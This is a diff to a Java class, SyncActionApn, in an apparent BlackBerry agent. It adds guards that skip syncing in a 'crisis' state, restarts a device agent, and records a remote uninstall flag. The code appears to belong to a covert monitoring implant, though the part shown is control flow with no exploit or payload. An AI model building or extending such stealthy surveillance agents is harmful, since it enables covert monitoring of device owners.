@@ -12,6 +12,7 @@ import blackberry.action.SyncActionInternet;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.ApnTransport;
 import blackberry.action.sync.transport.Wap2Transport;
+import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
@@ -123,12 +124,33 @@ public class SyncActionApn extends SyncAction {
         Check.requires(transport != null, "execute: null transport");
         //#endif
         
+        if (status.synced == true) {
+            //#ifdef DEBUG
+            debug.warn("Already synced in this action: skipping");
+            //#endif
+            return false;
+        }
+
+        if (status.crisisSync()) {
+            //#ifdef DEBUG
+            debug.warn("SyncAction - no sync, we are in crisis");
+            //#endif
+            return false;
+        }
+
+        wantReload = false;
+        wantUninstall = false;
+
+        agentManager.reStart(Agent.AGENT_DEVICE);
+        
+        boolean ret=false;
+        
         if (transport.isAvailable()) {
             //#ifdef DEBUG
             debug.trace("execute: transport available");
             //#endif
             protocol.init(transport);
-            boolean ret;
+            
             try {
                 ret = protocol.start();
                 wantUninstall = protocol.uninstall;
@@ -137,20 +159,33 @@ public class SyncActionApn extends SyncAction {
                 //#ifdef DEBUG
                 debug.error(e);
                 //#endif
-                return false;
+                ret = false;
             }
             
             //#ifdef DEBUG
             debug.trace("execute protocol: " + ret);
             //#endif
-            
-            return ret;
+
         }else{
             //#ifdef DEBUG
             debug.trace("execute: transport not available");
             //#endif
 
         }
+        
+        if (ret) {
+            //#ifdef DEBUG
+            debug.info("SyncAction OK");
+            //#endif
+
+            status.synced = true;
+            return true;
+        }
+
+        //#ifdef DEBUG
+        debug.error("InternetSend Unable to perform");
+        //#endif
+
         return false;
     }
 }
